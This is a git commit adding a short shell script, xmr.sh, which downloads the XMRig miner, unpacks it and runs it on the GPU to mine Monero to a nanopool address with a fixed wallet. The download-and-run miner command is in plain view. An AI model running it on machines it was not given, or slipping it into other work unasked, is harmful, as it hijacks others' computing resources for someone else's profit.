4635f5595316f93cda6d64e0a208d749f97ff237
shaiban09 <112415268+shaiban09@users.noreply.github.com>
2022-10-02 22:59:35 +0300

    Create xmr.sh

---
+++ xmr.sh
@@ -0,0 +1,3 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz && tar xvzf xmrig-6.15.0-linux-static-x64.tar.gz && cd xmrig-6.15.0 && ./xmrig --no-cpu --cuda -o xmr-asia1.nanopool.org:14433 -u 47rRaVrE8xhenVsK2oF5spDgR7A6CJiKT6SHrNmuq8UGJUp3fRegVpS583QQPTsRWWL7L87FSKKaf5qHrpfDPPpM6CzmhGY --tls --coin monero
+
+
